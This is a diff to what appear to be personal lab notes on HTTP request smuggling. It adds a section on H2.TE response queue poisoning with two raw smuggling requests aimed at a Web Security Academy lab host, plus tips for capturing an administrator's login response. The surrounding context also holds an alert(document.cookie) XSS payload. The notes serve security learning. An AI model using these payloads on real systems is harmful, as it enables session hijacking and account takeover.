@@ -587,3 +587,42 @@ and the payload in the body `alert(document.cookie)` and set the website into th
 
     X=1
  and we should keep doing that until we have to 200 ok responses for both requests (attack and normal), better uses a script to launch the attack request followed bu a normal request with a 300ms lap between them.
+
+ ## Response queue poisoning H2.TE
+
+ The probability of this to work is 1/100.
+ the goal of this attack is to poison the backend with 404 error queues, and wait for an admin to login, and he'll get the our 404 response, and when we send the following response we hope to get his 302 response in our next queue.
+
+ So for this we need to keep sending the same payload multiple times and just wait, the payload is formed with two complete requests, and the back end is a TE vulnerable.
+
+Remember to terminate the smuggled request properly by including the sequence \r\n\r\n after the Host header.
+
+If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again. 
+
+Confirming H2.TE vulnerability.
+
+    POST / HTTP/2
+    Host: 0a6300e5031f645f808858e9009a0029.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /jkhrfg HTTP/1.1
+    X-Ignore: x
+
+And then we should get an HTTP header 404 not found
+
+Then, we modify both the paths in the request, and we make the second smuggled request a valid one, and we keep sending only the attack request and again hoping to get a 302 OK
+
+    POST /rgegr HTTP/2
+    Host: 0a6300e5031f645f808858e9009a0029.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /jkhrfg HTTP/1.1
+    Host: 0a6300e5031f645f808858e9009a0029.web-security-academy.net
+    \r\n // don't forget it.
+ We ca automate the process with burp, and DON'T FORGET TO DEACTIVATE UPDATE CONTENT-LENGTH !! OTHERWISE IT WILL NOT WORK
